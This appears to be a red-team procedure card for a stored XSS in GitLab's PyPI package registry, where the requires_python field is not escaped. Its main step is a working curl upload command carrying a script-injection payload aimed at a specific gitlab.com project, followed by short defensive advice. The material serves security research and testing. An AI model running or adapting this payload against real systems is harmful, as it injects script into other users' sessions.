---
id: proc-upload-pypi-xss-856836
tags:
  - xss
  - upload
  - pypi
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/upload-pypi-package-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.970Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Upload-Malicious-PyPi-Package

## Summary

This procedure uploads a PyPi package to GitLab with a malicious payload in the requires_python field, exploiting the lack of sanitization to store XSS for later execution on the simple API endpoint.

## Description

The vulnerability stems from package_presenter.rb, where requires_python is truncated to 50 characters but not HTML-escaped before insertion into a data attribute. Uploading via the /packages/pypi API stores the payload, which injects when the simple endpoint is accessed, e.g., closing quotes and adding <script>alert(1)</script>.

## Requirements

1. Existing GitLab project with PyPi enabled
2. Personal access token with write_package_registry scope
3. Dummy package file (e.g., /tmp/lala.txt)
4. curl installed

## Defense

Defensive measures and detection strategies:

- Sanitize user inputs in HTML contexts (e.g., Rails html_escape)
- Implement strict CSP policies blocking inline scripts
- Validate package metadata against expected formats

## Objectives

1. Store malicious payload in requires_python
2. Prepare for XSS trigger on endpoint visit
3. Demonstrate injection without immediate execution

## Instructions

### Step 1: Prepare and Upload Package

**Context**: Create a simple text file as package content and upload using the API, overriding requires_python with the payload '"><script>alert(1)</script>' to break out of the attribute.

**Command** ([[commands/upload-pypi-package-xss]]):
```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

> The -F flags set form data; the second requires_python overrides the first. Expected output: 201 Created with package details. Verify upload in GitLab UI under project packages.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/upload-pypi-package-xss]]

## Tools Used

- [[tools/curl]]

## Tags

- [[xss]]
- [[upload]]
- [[pypi]]
